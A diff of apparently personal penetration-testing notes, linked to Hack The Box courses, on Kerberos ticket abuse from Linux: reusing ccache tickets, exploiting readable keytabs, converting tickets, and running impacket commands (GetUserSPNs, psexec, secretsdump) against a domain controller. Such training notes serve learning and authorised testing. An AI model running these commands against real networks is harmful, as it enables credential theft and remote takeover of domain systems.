@@ -576,26 +576,25 @@ $ cat /etc/hosts
 
 </div><div>
 
-#### 
+#### Active Directory On Linux — Managing Tickets
+
+[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 
 [Kerberos tickets](#kerberos) are stored in `/tmp` as ccache files. The current ticket is set by setting the `KRB5CCNAME` environment variable.
 
 ```shell!
-$ export KRB5CCNAME=FILE:/tmp/krb5cc_xxx_yyy
+$ export KRB5CCNAME=/tmp/krb5cc_xxx_yyy
 $ export KRB5CCNAME=FILE:/var/lib/sss/db/ccache_XXX.YYY
 $ klist # information about the current ticket
-Default principal: XXX@EXAMPLE.COM
+Default principal: username@EXAMPLE.COM
 ```
 
 ☠️ We can use someone else's ticket as long as we got `rw` on it.
 
-You can use the ccache with many of impacket tools:
+#### Active Directory On Linux — Keytabs
 
-```shell!
-$ # example.com, dev.example.com, and DC01.example.com must be in /etc/hosts
-$ impacket-psexec dev.example.com/hacker@DC01.example.com -k -no-pass -target-ip 172.16.5.5
-$ impacket-secretsdump dev.example.com/hacker@DC01.example.com -no-pass -k -just-dc-user EXAMPLE/username
-```
+[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
 Users and scripts can use a [keytab](https://kb.iu.edu/d/aumh) file to store Kerberos principals and encryption keys that can be used to create tickets without having to store the plaintext password. To use it, we need `rw` permissions on it.
 
@@ -606,6 +605,35 @@ $ klist # new ticket associated with xxx@yyy.zzz
 ```
 
 ☠️ If you find a readable keytab file, you can create tickets. You can also use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) <small>(0.2k ⭐)</small> to dump the hash and crack it.
+
+#### Active Directory On Linux — Importing/Exporting Tickets
+
+[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+We can use impacket to convert tickets:
+
+```shell!
+$ impacket-ticketConverter xxx yyy.kirbi # from ccache to kirbi
+$ impacket-ticketConverter xxx.kirbi xxx.ccache # from kirbi to ccache
+```
+
+#### Active Directory On Linux — Using Tickets
+
+[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+You can use the ccache with many of impacket tools with `-k`:
+
+```shell!
+$ impacket-GetUserSPNs EXAMPLE.COM/username -k -no-pass
+$ impacket-GetUserSPNs EXAMPLE.COM/username@EXAMPLE.COM -k -no-pass
+```
+```shell!
+$ # example.com, dev.example.com, and DC01.example.com must be in /etc/hosts
+$ impacket-psexec dev.example.com/hacker@DC01.example.com -k -no-pass -target-ip 172.16.5.5
+$ impacket-secretsdump dev.example.com/hacker@DC01.example.com -no-pass -k -just-dc-user EXAMPLE/username
+```
 </div></div>
 
 <hr class="sep-both">
